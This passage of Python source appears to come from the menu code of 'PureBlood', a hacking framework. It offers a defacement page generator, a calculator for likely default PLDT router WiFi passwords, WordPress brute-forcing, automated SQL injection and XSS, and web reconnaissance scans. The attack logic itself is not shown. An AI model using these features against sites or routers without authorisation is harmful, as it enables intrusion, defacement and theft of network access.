            shortcut_icon = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Shortcut Icon{1})> {2}'.format(green, blue, cyan, red)))
            meta_description = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Meta Description{1})> {2}'.format(green, blue, cyan, red)))
            meta_image = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Meta Image{1})> {2}'.format(green, blue, cyan, red)))
            logo = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Logo{1})> {2}'.format(green, blue, cyan, red)))
            hacker_name = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Hacker Name{1})> {2}'.format(green, blue, cyan, red)))
            message1 = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Message 1{1})> {2}'.format(green, blue, cyan, red)))
            message2 = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Message 2{1})> {2}'.format(green, blue, cyan, red)))
            groups = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Group/s{1})> {2}'.format(green, blue, cyan, red)))
            deface_page_output_filename = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Output Filename{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            title = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Title{1})> {2}'.format(green, blue, cyan, red)))
            shortcut_icon = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Shortcut Icon{1})> {2}'.format(green, blue, cyan, red)))
            meta_description = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Meta Description{1})> {2}'.format(green, blue, cyan, red)))
            meta_image = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Meta Image{1})> {2}'.format(green, blue, cyan, red)))
            logo = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Logo{1})> {2}'.format(green, blue, cyan, red)))
            hacker_name = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Hacker Name{1})> {2}'.format(green, blue, cyan, red)))
            message1 = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Message 1{1})> {2}'.format(green, blue, cyan, red)))
            message2 = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Message 2{1})> {2}'.format(green, blue, cyan, red)))
            groups = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Group/s{1})> {2}'.format(green, blue, cyan, red)))
            deface_page_output_filename = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>({3}Output Filename{1})> {2}'.format(green, blue, cyan, red)))
        gdeface_page = cgenerator.deface_page(title, shortcut_icon, meta_description, meta_image, logo, hacker_name, message1, message2, groups)
        if '.html' in deface_page_output_filename:
            deface_page_output_filename = deface_page_output_filename
        else:
            deface_page_output_filename = deface_page_output_filename + '.html'
        deface_page_output_file = open('outputs/generator/' + deface_page_output_filename, 'w+')
        deface_page_output_file.write(gdeface_page)
        deface_page_output_file.close()
        print ('\nOutput saved in outputs/generator/' + deface_page_output_filename + '{0}')
        print (reset + bold)
        print ('{0}='.format(red) * int(sizex))
        generator()
    elif choice == 2:
        if sys.version_info[0] == 3:
            length = int(input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Length{1})> {2}'.format(green, blue, cyan, red)))
            text = str(input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            length = int(raw_input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Length{1})> {2}'.format(green, blue, cyan, red)))
            text = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))
        gpassword_generator1, gpassword_generator2, gpassword_generator3  = cgenerator.password_generator(length, text)
        print ('{0}='.format(red) * int(sizex))
        print (reset + bold)
        print ('Random Password: ' + gpassword_generator1)
        print ('MD5: ' + gpassword_generator2)
        print ('L33T: ' + gpassword_generator3)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        generator()
    elif choice == 3:
        if sys.version_info[0] == 3:
            print ('{2}[{1}#{2}] {3}- {4}Last 5 Numbers if any. EX: PLDTHOMEDSLXXXXX where X is the number{0}'.format(reset, green, blue, yellow, cyan))
            digit5 = str(input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 Digit{1})> {2}'.format(green, blue, cyan, red)))
            print ('{2}[{1}#{2}] {3}- {4}Last 5 MAC Characters. EX: 00:4a:00:d0:44:c0 where 044C0 is the last 5 MAC Characters{0}'.format(reset, green, blue, yellow, cyan))
            mac5 = str(input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 MAC Char{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            print ('{2}[{1}#{2}] {3}- {4}Last 5 Numbers if any. EX: PLDTHOMEDSLXXXXX where X is the number{0}'.format(reset, green, blue, yellow, cyan))
            digit5 = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 Digit{1})> {2}'.format(green, blue, cyan, red)))
            print ('{2}[{1}#{2}] {3}- {4}Last 5 MAC Characters. EX: 00:4a:00:d0:44:c0 where 044C0 is the last 5 MAC Characters{0}'.format(reset, green, blue, yellow, cyan))
            mac5 = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 MAC Char{1})> {2}'.format(green, blue, cyan, red)))
        gpldt_password_calculator1, gpldt_password_calculator2, gpldt_password_calculator3, gpldt_password_calculator4, gpldt_password_calculator5  = cgenerator.pldt_password_calculator(digit5, mac5)
        print ('{0}='.format(red) * int(sizex))
        print (reset + bold)
        print ('[#] - Possible Password of the PLDT WIFI:')
        print ('\nFOR : PLDTHOMEDSL, PLDTmyDSLPAL, and PLDTmyDSLBiz')
        for i in gpldt_password_calculator1:
            print (' > ' + i)
        print ('\nFOR : PLDTHOMEDSLxxxxx')
        for i in gpldt_password_calculator2:
            print (' > ' + i)
        print ('\nFOR : PLDTHOMEFIBR_xxxxxx')
        print (' > ' + gpldt_password_calculator3)
        print ('\nFOR : PLDTHOMEFIBRxxxxxx')
        for i in gpldt_password_calculator4:
            print (' > ' + i)
        print ('\nFOR : HomeBro_Ultera')
        print (' > ' + gpldt_password_calculator5)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        generator()
    elif choice == 4:
        if sys.version_info[0] == 3:
            text = str(input('{0}PureBlood{1}>{0}Generator{1}>{0}TextToHash{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            text = str(raw_input('{0}PureBlood{1}>{0}Generator{1}>{0}TextToHash{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))
        gtext_to_hash = cgenerator.text_to_hash(text)
        print ('{0}='.format(red) * int(sizex))
        print (reset + bold)
        print (gtext_to_hash)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        generator()
    elif choice == 90:
        main()
    elif choice == 99:
        print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
        sys.exit()
    else:
        print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid choice!{0}'.format(reset, red, blue, yellow))
        time.sleep(2)
        print ('')
        generator()



def web_application_attack():
    global cweb_application_atttack
    print ("""{3}[ {5}Web Application Attack {3}]

    {2}01{3}) {5}Wordpress
    {2}02{3}) {5}SQL Injection
    {2}90{3}) {5}Back To Menu
    {2}95{3}) {5}Set Target
    {2}99{3}) {5}Exit
{0}""".format(reset, red, green, blue, yellow, cyan))
    if sys.version_info[0] == 3:
        try:
            choice = int(input('{0}PureBlood{1}({3}WebApplicationAttack{1})> {2}'.format(green, blue, cyan, red)))
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
            print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))
            time.sleep(2)
            print ('')
            web_application_attack()
    elif sys.version_info[0] == 2:
        try:
            choice = int(raw_input('{0}PureBlood{1}({3}WebApplicationAttack{1})> {2}'.format(green, blue, cyan, red)))
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
            print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))
            time.sleep(2)
            print ('')
            web_application_attack()
    cweb_application_atttack = WebApplicationAttack()
    if choice == 1:
        print ("""{3}[ {5}Web Application Attack {3}]

    {2}01{3}) {5}WPScan (Kali Linux) - Install manually on other OS
    {2}02{3}) {5}WPScan Bruteforce (Kali Linux) - Install manually on other OS
    {2}03{3}) {5}Wordpress Plugins Vulnerability Checker
    {2}90{3}) {5}Back To Menu
    {2}95{3}) {5}Set Target
    {2}99{3}) {5}Exit
    {0}""".format(reset, red, green, blue, yellow, cyan))
        if sys.version_info[0] == 3:
            try:
                choice1 = int(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Wordpress{1})> {2}'.format(green, blue, cyan, red)))
            except KeyboardInterrupt:
                print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
                sys.exit()
            except ValueError:
                print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))
                time.sleep(2)
                print ('')
                web_application_attack()
        elif sys.version_info[0] == 2:
            try:
                choice1 = int(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Wordpress{1})> {2}'.format(green, blue, cyan, red)))
            except KeyboardInterrupt:
                print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
                sys.exit()
            except ValueError:
                print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))
                time.sleep(2)
                print ('')
                web_application_attack()
        if choice1 == 1:
            print ('{0}='.format(red) * int(sizex))
            print (reset + bold)
            try:
                wap_wp_scan = cweb_application_atttack.wp_scan(url)
            except NameError:
                print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
                time.sleep(2)
                web_application_attack()
            except KeyboardInterrupt:
                print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
                sys.exit()
            print (reset)
            print ('{0}='.format(red) * int(sizex))
            web_application_attack()
        elif choice1 == 2:
            print ('{0}='.format(red) * int(sizex))
            print (reset + bold)
            try:
                wap_wp_scan_bruteforce = cweb_application_atttack.wp_scan_bruteforce(url)
            except NameError:
                print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
                time.sleep(2)
                web_application_attack()
            except KeyboardInterrupt:
                print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
                sys.exit()
            print (reset)
            print ('{0}='.format(red) * int(sizex))
            print ('')
            web_application_attack()
        elif choice1 == 3: # Exploit-DB.com
            print ('{0}='.format(red) * int(sizex))
            print (reset + bold)
            try:
                wap_wordpress_plugin_checker = cweb_application_atttack.wordpress_vulnerability_check(url)
            except NameError:
                print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
                time.sleep(2)
                web_application_attack()
            except KeyboardInterrupt:
                print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
                sys.exit()
            print (reset)
            print ('{0}='.format(red) * int(sizex))
            print ('')
            web_application_attack()
        elif choice1 == 90:
            main()
        elif choice1 == 95:
            print ('{2}[{1}#{2}] {3}- {4}Please don\'t put "/" in the end of the Target.{0}'.format(reset, green, blue, yellow, cyan))
            if sys.version_info[0] == 3:
                target = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))
            if sys.version_info[0] == 2:
                target = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))
            set_target(target, 2)
        elif choice1 == 99:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        else:
            print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid choice!{0}'.format(reset, red, blue, yellow))
            time.sleep(2)
            print ('')
            web_application_attack()
    elif choice == 2:
        print ('{0}='.format(red) * int(sizex))
        print (reset + bold)
        try:
            wap_auto_sql_injection = cweb_application_atttack.auto_sql_injection(url)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            print ('')
            web_application_attack()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        print ('')
        web_application_attack()
    elif choice == 3:
        print ('{0}='.format(red) * int(sizex))
        print (reset + bold)
        try:
            wap_auto_xss_injection = cweb_application_atttack.wap_auto_xss_injection(url)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            print ('')
            web_application_attack()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        print ('')
        web_application_attack()
    elif choice == 90:
        main()
    elif choice == 95:
        print ('')
        print ('{2}[{1}#{2}] {3}- {4}Please don\'t put "/" in the end of the Target.{0}'.format(reset, green, blue, yellow, cyan))
        if sys.version_info[0] == 3:
            target = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            target = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))
        print ('')
        set_target(target, 2)
    elif choice == 99:
        print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
        sys.exit()
    else:
        print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid choice!{0}'.format(reset, red, blue, yellow))
        time.sleep(2)
        print ('')
        web_application_attack()



def web_pentest():
    global web_pentest_output
    global web_pentest_outputfile
    print ("""{3}[ {5}Web Pentest {3}]

    {2}01{3}) {5}Banner Grab
    {2}02{3}) {5}Whois
    {2}03{3}) {5}Traceroute
    {2}04{3}) {5}DNS Record
    {2}05{3}) {5}Reverse DNS Lookup
    {2}06{3}) {5}Zone Transfer Lookup
    {2}07{3}) {5}Port Scan
    {2}08{3}) {5}Admin Panel Scan
    {2}09{3}) {5}Subdomain Scan
    {2}10{3}) {5}CMS Identify
    {2}11{3}) {5}Reverse IP Lookup
    {2}12{3}) {5}Subnet Lookup
    {2}13{3}) {5}Extract Page Links
    {2}14{3}) {5}Directory Fuzz
    {2}15{3}) {5}File Fuzz
    {2}16{3}) {5}Shodan Search
    {2}17{3}) {5}Shodan Host Lookup
    {2}90{3}) {5}Back To Menu
    {2}95{3}) {5}Set Target
    {2}99{3}) {5}Exit
{0}""".format(reset, red, green, blue, yellow, cyan))
    if sys.version_info[0] == 3:
        try:
            choice = int(input('{0}PureBlood{1}({3}WebPentest{1})> {2}'.format(green, blue, cyan, red)))
        except KeyboardInterrupt:
            try:
                print ('\n[+] - Output saved in outputs/web_pentest/' + web_pentest_output)
            except:
                pass
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
            print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))
            time.sleep(2)
            print ('')
            web_pentest()
    elif sys.version_info[0] == 2:
        try:
            choice = int(raw_input('{0}PureBlood{1}({3}WebPentest{1})> {2}'.format(green, blue, cyan, red)))
        except KeyboardInterrupt:
            try:
                print ('\n[+] - Output saved in outputs/web_pentest/' + web_pentest_output)
            except:
                pass
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
            print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))
            time.sleep(2)
            print ('')
            web_pentest()
    cweb_pentest = WebPentest()
    if choice == 1:
        try:
            wp_banner_grab = cweb_pentest.banner_grab(url)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] Banner Grab Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        print (wp_banner_grab)
        web_pentest_outputfile.write('\n' + wp_banner_grab)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 2:
        try:
            wp_whois = cweb_pentest.whois(url)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] Whois Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        print (wp_whois)
        web_pentest_outputfile.write('\n' + str(wp_whois))
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 3:
        try:
            wp_traceroute = cweb_pentest.traceroute(hostname)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] Traceroute Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        print (wp_traceroute)
        web_pentest_outputfile.write('\n' + wp_traceroute)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 4:
        try:
            wp_dns_record = cweb_pentest.dns_record(hostname)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] DNS Record Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        web_pentest_outputfile.write('\n')
        for i in wp_dns_record:
            print (i)
            web_pentest_outputfile.write(str(i) + '\n')
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 5:
        try:
            wp_reverse_dns_lookup = cweb_pentest.reverse_dns_lookup(ip)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] Reverse DNS Lookup Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        print (wp_reverse_dns_lookup)
        web_pentest_outputfile.write('\n' + wp_reverse_dns_lookup)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 6:
        try:
            wp_zone_transfer_lookup = cweb_pentest.zone_transfer_lookup(hostname)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] Zone Transfer Lookup Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        print (wp_zone_transfer_lookup)
        web_pentest_outputfile.write('\n' + wp_zone_transfer_lookup)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 7:
        if sys.version_info[0] == 3:
            port_end = int(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}PortScan{1}>({3}Port End{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            port_end = int(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}PortScan{1}>({3}Port End{1})> {2}'.format(green, blue, cyan, red)))
        try:
            wp_port_scan = cweb_pentest.port_scan(hostname, port_end)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] Port Scan Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        web_pentest_outputfile.write('\n')
        for i in wp_port_scan:
            print (i)
            web_pentest_outputfile.write(str(i) + '\n')
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 8:
        try:
            wp_admin_panel_scan = cweb_pentest.admin_panel_scan(url)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] Admin Panel Scan Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        web_pentest_outputfile.write('\n')
        for i in wp_admin_panel_scan:
            print (i)
            web_pentest_outputfile.write(str(i) + '\n')
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 9:
        if sys.version_info[0] == 3:
            subdomain_list = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}SubdomainScan{1}>({3}Subdomain List{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            subdomain_list = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}SubdomainScan{1}>({3}Subdomain List{1})> {2}'.format(green, blue, cyan, red)))
        try:
            wp_subdomain_scan = cweb_pentest.subdomain_scan(hostname, subdomain_list)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        so_200, so_301, so_302, so_403 = wp_subdomain_scan
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] Subdomain Scan Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        web_pentest_outputfile.write('\n')
        for i in so_200:
            print ('[+] 200 - ' + i)
            web_pentest_outputfile.write('[+] 200 - ' + i + '\n')
        for i in so_301:
            print ('[!] 301 - ' + i)
            web_pentest_outputfile.write('[+] 301 - ' + i + '\n')
        for i in so_302:
            print ('[!] 302 - ' + i)
            web_pentest_outputfile.write('[+] 302 - ' + i + '\n')
        for i in so_403:
            print ('[!] 403 - ' + i)
            web_pentest_outputfile.write('[+] 403 - ' + i + '\n')
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 10:
        try:
            wp_cms_detect = cweb_pentest.cms_detect(hostname)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] CMS Detect - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        print (wp_cms_detect)
        web_pentest_outputfile.write('\n' + wp_cms_detect)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 11:
        try:
            wp_reverse_ip_lookup = cweb_pentest.reverse_ip_lookup(hostname)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] Reverse IP Lookup Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        print (wp_reverse_ip_lookup)
        web_pentest_outputfile.write('\n' + wp_reverse_ip_lookup)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 12:
        if sys.version_info[0] == 3:
            subnet_input = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}SubnetLookup{1}>({3}CIDR or IP with NetMask{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            subnet_input = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}SubnetLookup{1}>({3}CIDR or IP with NetMask{1})> {2}'.format(green, blue, cyan, red)))
        try:
            wp_subnet_lookup = cweb_pentest.subnet_lookup(subnet_input)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        print (reset + bold)
        print (wp_subnet_lookup)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest()
    elif choice == 13:
        try:
            wp_links_extract = cweb_pentest.links_extract(url)
        except NameError:
            print ('\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))
            time.sleep(2)
            web_pentest()
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('[+] Links Extract Result - ' + url)
        web_pentest_outputfile.write('\n============================================================')
        print (reset + bold)
        print (wp_links_extract)
        web_pentest_outputfile.write('\n' + wp_links_extract)
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_pentest_outputfile.write('\n')
        web_pentest_outputfile.write('============================================================\n')
        web_pentest()
    elif choice == 14:
        if sys.version_info[0] == 3:
            directory_list = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}DirectoryFuzz{1}>({3}Directory List{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            directory_list = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}DirectoryFuzz{1}>({3}Directory List{1})> {2}'.format(green, blue, cyan, red)))
        try:
            wp_directory_fuzz1, wp_directory_fuzz2, wp_directory_fuzz3 = cweb_pentest.directory_fuzz(url, directory_list)
        except NameError:
